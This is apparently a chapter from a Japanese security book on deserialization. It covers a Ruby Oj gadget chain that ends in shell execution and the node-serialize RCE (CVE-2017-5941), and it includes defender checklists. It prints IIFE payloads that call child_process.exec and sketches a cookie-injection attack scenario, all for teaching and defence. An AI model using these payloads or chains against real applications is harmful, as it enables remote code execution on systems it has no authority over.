#### 連鎖全体の構造

1. **トリガー**: 配列をHashのキーとして挿入する（前節で説明した「配列キーは`Array#hash`経由で各要素の`.hash`を呼ぶ」性質を利用）。
2. **入口**: `DeprecatedInstanceVariableProxy#hash` が呼ばれ、実装が消去されているため `method_missing` に落ちる。
3. **ディスパッチ**: `method_missing` 内部の `target()` メソッドが `@instance.__send__(@method)` を実行する。
4. **シンク**: `@method` として `"key_password"` を、`@instance` として攻撃者が用意した `Puma::MiniSSL::Context` インスタンス（`@key_password_command` に任意コマンドを仕込んだもの）を指定しておくことで、最終的に `Open3.capture3` 経由でシェルコマンドが実行される。

このガジェットチェーンをOjペイロードとして構築する場合、Ojの `^c`（クラス自体を指すディレクティブ）と `^o`（オブジェクト指定）を組み合わせ、`DeprecatedInstanceVariableProxy`インスタンスの `@instance` フィールドが `Puma::MiniSSL::Context` オブジェクトを指し、その `Context` オブジェクトの `@key_password_command` に任意コマンド文字列を持たせるという、入れ子構造で表現される。

#### 探索の過程で「行き止まり」と判断されたパターン

このブログはまた、有望に見えて実際には使えなかった候補についても記録しており、これはガジェット探索の再現性・効率を高める上で有用な知見である。

- **`ERB#result`**: Ruby 3.x系で `singleton class` に対する検証が追加され、テンプレートインジェクション経由の悪用が塞がれた。
- **DRb（分散Rubyオブジェクト）関連パターン**: 通常の本番Rails環境ではロードされないため、実務上の攻撃面としては現実的でない。
- **Proc（無名関数オブジェクト）を用いるsink**: そもそもデシリアライザ経由ではProcオブジェクトを構築できないため対象外。
- **`public_send` パターン**: 呼び出し先オブジェクトと引数の両方がインスタンス変数由来という条件を満たす実装が実際には見つからなかった。

> 出典: Behrad's Blog: Hunting for Deserialization Gadgets in the Rails Ecosystem — https://behradtaher.dev/Hunting-for-Deserialization-Gadgets/

---

### 7. 防御側の実務チェックリスト

以上の3資料を踏まえ、防御側が確認すべき点を整理する。

1. **危険なsinkの棚卸し**: コードベース全体（自社コードだけでなく依存gemも含む）から `Marshal.load`、`YAML.load` / `YAML.unsafe_load`、`Oj.load`（safe modeなし）、`JSON.load`（`json_create`対応クラス併用時）を機械的に検索する。GitHubのコードスキャン機能は「信頼できないデータのデシリアライズ（Deserialization of user-controlled data）」というクエリでこれを検出できる。
2. **入力の出所を確認**: 見つかったsinkに渡されるデータが、外部（HTTPリクエストボディ、Cookie、キャッシュストア、メッセージキュー等）に由来していないかを追跡する。
3. **安全なAPIへの置換**:
   - Marshal: 信頼できない入力には使わない。
   - YAML: `YAML.safe_load`（Psych 4.0では無印の`YAML.load`が実質これに相当）を使う。
   - Oj: `Oj.safe_load` または `Oj.load(data, mode: :strict)` を使う。
   - JSON: `JSON.parse`（プレーンなハッシュ/配列のみを復元し、任意クラスの復元を行わない）を優先する。
4. **バージョン管理**: 使用しているRuby本体・Oj・Psych・RubyGemsのバージョンを把握し、本章で示したガジェットチェーンの動作確認バージョン（Ruby 3.3.3時点でOj/Ox/Psych系、Ruby 3.2.4時点でMarshal系）と照らし合わせて、自環境が該当する場合は特に優先度を上げて対処する。ただし新しいバージョンでガジェットが動かなくなったとしても、それは特定の連鎖が壊れただけであり、危険なsink自体（`Oj.load`の無制限モードなど）が残っている限り、新しいガジェットチェーンが発見され得るという前提を忘れないこと。
5. **自組織管理下での実証にとどめる**: 本章で紹介したPoC類は、あくまで自分が権限を持つ検証環境・自社アプリケーションに対する脆弱性の実証にのみ用いること。実在の第三者サービスや本番環境への無許可の実行は行わない。

## Node.jsのnode-serializeデシリアライゼーション

### この節で扱う対象

Node.jsエコシステムには、Java の `ObjectInputStream` や PHP の `unserialize()` のような「言語標準のオブジェクトシリアライズ機構」は存在しません。しかし、開発者が独自に「JavaScriptオブジェクトを関数（メソッド）ごとJSON風の文字列に変換し、あとで復元する」ための小さなユーティリティを自作・利用するケースがあり、その代表例が npm パッケージ **`node-serialize`** です。本節では、この node-serialize が 2017 年に公表した RCE（Remote Code Execution: リモートからの任意コード実行）脆弱性 **CVE-2017-5941** を題材に、「関数までシリアライズする」設計がなぜ致命的な sink（入力が最終的に危険な形で実行・解釈される代入先）になるのかを、ソースコードレベルで解説します。

### node-serializeとは何か

`node-serialize` は、JavaScript のオブジェクト（プレーンな値だけでなく、関数プロパティ、循環参照、`Date` などの組み込みオブジェクトを含む）を JSON 文字列へ変換し、あとで元のオブジェクトに戻すためのライブラリです。標準の `JSON.stringify` / `JSON.parse` は関数を保持できません（関数は JSON にない型なので単純に無視される）が、node-serialize は関数の中身（ソースコード文字列）ごと保存し、復元時にそれを実行可能な関数へ戻す、という点で標準 JSON と一線を画しています。

> 出典: node-serialize — https://www.npmjs.com/package/node-serialize

用途としては、セッション情報やキャッシュされたオブジェクトを Cookie やファイルに保存し、後で `unserialize()` して使う、といったシナリオが想定されていました。API はシンプルで、次のように使います。

```javascript
var serialize = require('node-serialize');

// シリアライズ: 関数を含むオブジェクトを文字列化
var obj = {
  name: "admin",
  greet: function () { return "hello"; }
};
var str = serialize.serialize(obj);
// => '{"name":"admin","greet":"_$$ND_FUNC$$_function () { return \\"hello\\"; }"}'

// デシリアライズ: 文字列から元のオブジェクトを復元(関数も復元される)
var restored = serialize.unserialize(str);
console.log(restored.greet()); // "hello"
```

ここで注目すべきは、シリアライズされた関数プロパティの値が `"_$$ND_FUNC$$_"` という**マーカー文字列（識別用の目印）**で始まる、ただの文字列としてJSON内に埋め込まれる点です。この設計そのものが脆弱性の根です。

### 内部実装：なぜ`eval`が使われるのか

node-serialize のソース（`lib/serialize.js`）を追うと、シリアライズ・デシリアライズの処理は次のような流れになっています。

**serialize側の処理**

- オブジェクトの各プロパティを走査する
- 値が関数の場合、正規表現 `/^function\s*[^(]*\(.*\)\s*\{\s*\[native code\]\s*\}$/` でその関数が「ネイティブ関数（`[native code]` と表示される、V8 に組み込まれた関数）」かどうかを判定する
- ネイティブ関数でなければ、`Function.prototype.toString()` によって関数のソースコード文字列を取得し、先頭に `_$$ND_FUNC$$_` というマーカーを付けて文字列として格納する
- オブジェクト自身の循環参照（自分自身を指すプロパティ）は `_$$ND_CC$$_` プレフィックス付きのパス文字列として記録する

**unserialize側の処理**

- 入力がJSON文字列であれば、まず標準の `JSON.parse` でパースする
- 得られたオブジェクトを再帰的に走査し、キーパスの区切り文字 `_$$.$$_` を使って循環参照を後から復元するための情報を集める
- 値の文字列が `_$$ND_FUNC$$_` で始まっていた場合、その**マーカー以降の文字列をそのまま `eval('(' + str + ')')` に渡して評価する**ことで、文字列を再び「実行可能な関数オブジェクト」へ復元する

> 出典: luin/serialize (node-serializeの実装) — https://github.com/luin/serialize/issues/4

この最後のステップこそが sink です。`eval()` は「文字列として渡されたJavaScriptコードをその場でコンパイル・実行する」組み込み関数であり、**渡す文字列が信頼できる場所からのものである限りは問題ありません**。しかし `unserialize()` に渡す文字列（＝復元対象のJSON全体）が外部入力に由来する場合、攻撃者は「関数の中身」として任意のJavaScriptコードを注入できてしまいます。これは PHP の `unserialize()` が起こす POP チェーン攻撃や、Java のガジェットチェーン攻撃とは異なるメカニズムですが、「デシリアライズ処理の内部で、入力に含まれる文字列がコードとして評価される」という点で本質的に同じ問題です。

### IIFEを使った攻撃手法（CVE-2017-5941）

攻撃者にとっての課題は、「関数を定義しただけ」では実行されない、という点です。`eval('(' + str + ')')` は文字列を関数**式**として評価しますが、それだけでは単に関数オブジェクトが作られるだけで、中身のコードは走りません。ここでセキュリティ研究者の Ajin Abraham（OpSecX）が実証したのが、**IIFE（Immediately Invoked Function Expression: 即時実行関数式）**を悪用する手法です。

IIFEはJavaScriptの一般的なイディオムで、`(function(){ ... })()` のように関数式の直後に `()` を置くことで、定義と同時に実行させるパターンです。node-serializeの `unserialize()` に渡されるJSON文字列のプロパティ値として、関数定義の直後に呼び出し括弧 `()` を付け加えた文字列を仕込むと、次のようなことが起こります。

```json
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(error, stdout, stderr) { console.log(stdout) });}()"}
```

この文字列がunserializeされる過程を追うと:

1. `unserialize()` はプロパティ `rce` の値が `_$$ND_FUNC$$_` で始まることを検出する
2. マーカー以降の文字列 `function (){...}()` を取り出し、`eval('(' + 'function (){...}()' + ')')` すなわち `eval('(function (){...}())')` を実行する
3. `eval` に渡された文字列は「関数式を定義してその場で呼び出す」という完全に妥当なJavaScript構文であるため、`()` によって関数本体が**その場で即座に実行される**
4. 関数本体に `require('child_process').exec(...)` のようなコードを仕込んでおけば、Node.jsプロセス上で任意のシェルコマンドが実行される

> 出典: OpSecX (Ajin Abraham): Exploiting Node.js deserialization bug for RCE — https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

正規表現によるネイティブ関数判定は「シリアライズ時」にしか働かず、「デシリアライズ時」には一切のフィルタリングが行われないという非対称性も、この脆弱性を成立させている重要なポイントです。つまり、攻撃者は正規のシリアライズ処理を経由せずに、`_$$ND_FUNC$$_` マーカーを手で付けた文字列を直接送りつけるだけで攻撃が完成します。攻撃者は node-serialize の `serialize()` 関数を呼ぶ必要すらなく、マーカーの書式さえ知っていれば任意のペイロードを組み立てられるのです。

このメカニズムは、GitHub の Issue でも次のように端的に指摘されています。

```
{"rce":"_$$ND_FUNC$$_function (){console.log('exploited')}()"}
```

> 出典: node-serialize IIFE攻撃の原Issue（luin/serialize #4） — https://github.com/luin/serialize/issues/4

この Issue は 2017年2月9日に登録されて以降、本稿執筆時点の情報でも未解決（Open）のまま残っており、公式なパッチが提供されていない状態が報告されています。CVE データベース上は **CVE-2017-5941**（node-serialize 0.0.4 における IIFE を用いたコード実行）として採番されており、関連する類似脆弱性として `serialize-to-js` モジュールの **CVE-2017-5954** も同時期に報告されました。node-serialize の最新リリースは npm 上で 0.0.4 のまま長らく更新が止まっており、この設計上の欠陥自体を修正する新バージョンは公開されていません。したがって、影響を受けるアプリケーションを検出した場合、バージョンアップによる解決は期待できず、後述する「利用そのものをやめる」対応が現実的な唯一の防御になります。

### 実際の攻撃シナリオ

この脆弱性が現実のアプリケーションで悪用可能になるのは、次のような典型パターンです。

- ログイン状態などのユーザーオブジェクトを `serialize.serialize()` で文字列化し、それをBase64エンコードしてCookieに保存する
- 後続のリクエストで、そのCookie値をBase64デコードしてから `serialize.unserialize()` に渡し、ユーザー情報を復元する

この設計では、Cookieはクライアント側（ブラウザ）に保存されるため、**攻撃者はCookieの値を自由に書き換えられます**。署名や暗号化なしにこのCookieを信頼してデシリアライズしていた場合、攻撃者は正規のCookie構造を真似つつ、任意のプロパティの値を前述のIIFEペイロードに差し替えたBase64文字列を作成し、それを自分のCookieとして送信するだけで、サーバー側で任意コードが実行されます。

これは「デシリアライズの入力元（Cookie、リクエストボディ、キャッシュファイルなど）が、クライアントや外部から改ざん可能な経路である」という、あらゆる言語のデシリアライズ脆弱性に共通する前提条件を体現しています。Node.jsにおいても、Java や PHP と同様に「デシリアライズ対象のバイト列・文字列がどこから来たか」を必ず追跡する必要があります。

### 防御策

node-serializeおよび同種の「関数を復元できるシリアライザ」を扱う際の防御は、次のように整理できます。

1. **根本対策: 信頼できない入力を`unserialize()`に渡さない**
   最も確実な防御は、そもそも外部から到達可能な入力（Cookie値、クエリパラメータ、リクエストボディなど)をこの種のデシリアライズ関数に通さないことです。セッション管理には `express-session` のような、署名付きかつ関数を含まないシンプルなシリアライズ機構(標準の`JSON.stringify`/`JSON.parse`)を使う実装に切り替えるべきです。

2. **関数を含むシリアライズ形式そのものを避ける**
   そもそも「オブジェクトの中に実行可能なコードを埋め込んで転送する」という設計自体がリスクの根源です。データだけを転送したいのであれば、関数を復元できない標準の `JSON.parse`/`JSON.stringify` で十分なケがほとんどです。関数までシリアライズする必要がある要件は、実務上まれであり、要件そのものを見直す価値があります。

3. **改ざん検知(HMAC署名など)の付与**
   やむを得ずCookieなどクライアント側に状態を保存する場合は、値に対してサーバー側の秘密鍵によるHMAC署名を付与し、デシリアライズ前に署名を検証して改ざんされていないことを確認する実装が有効です。ただし、この対策は「デシリアライズ関数自体の危険性」を無くすものではなく、あくまで「攻撃者が任意の値を送り込めなくする」ための入口対策である点に注意してください。署名鍵が漏洩したり、署名検証にタイミング攻撃などの不備があれば依然として突破されえます。

4. **依存関係の棚卸しと除去**
   自社のコードベースや依存パッケージの依存関係グラフの中に `node-serialize` や類似の関数シリアライズ系ライブラリ（`serialize-to-js` など）が含まれていないか、`npm ls` や SCA(Software Composition Analysis)ツールで確認し、使われていれば置き換えを検討してください。前述の通り本体の修正は行われていないため、バージョン更新では解決しません。

5. **監視の観点**
   仮に外部から受け取った値をデシリアライズせざるを得ない設計が既存システムに残っている場合、リクエストやCookie中に `_$$ND_FUNC$$_` や `_$$ND_CC$$_` といった node-serialize 固有のマーカー文字列が含まれていないかをWAF(Web Application Firewall)やログ監視で検知することは、暫定的な緩和策として有効です。ただし、これはシグネチャベースの検知であり、マーカー文字列を変数分割や別名パッケージ経由で難読化されると回避される可能性があるため、あくまで多層防御の一枚として位置づけるべきです。

### まとめ

node-serializeの脆弱性が示す教訓は、「シリアライズフォーマットが関数（すなわちコード）を保持できる設計になっている場合、デシリアライズ処理は本質的にコード実行機構そのものになる」という点です。`eval()` を使って文字列から関数を再構築するという実装判断が、IIFEという何の変哲もないJavaScript構文と組み合わさることで、リモートからの任意コード実行という重大な結果につながりました。Node.jsのエコシステムには、Javaのガジェットチェーンのような複雑な事前調査を要する攻撃手法は少ない一方で、こうした「シンプルだが本質的に危険な設計のライブラリ」が今も存在します。読者がコードレビューやセキュリティ診断を行う際は、`unserialize`、`eval`、`Function()`、`vm.runInContext` といったキーワードを起点に、外部入力がそれらのsinkへ到達する経路(データフロー)がないかを確認することが実践的な第一歩になります。


---

### ナビゲーション

- ← 前の章: [第4章 .NETデシリアライゼーションとViewState](04-dotnet-deserialization.md)
- 🏠 [目次（ホーム）](index.md)
- → 次の章: [第6章 ガジェットチェーン発見の自動化と方法論](06-gadget-discovery.md)
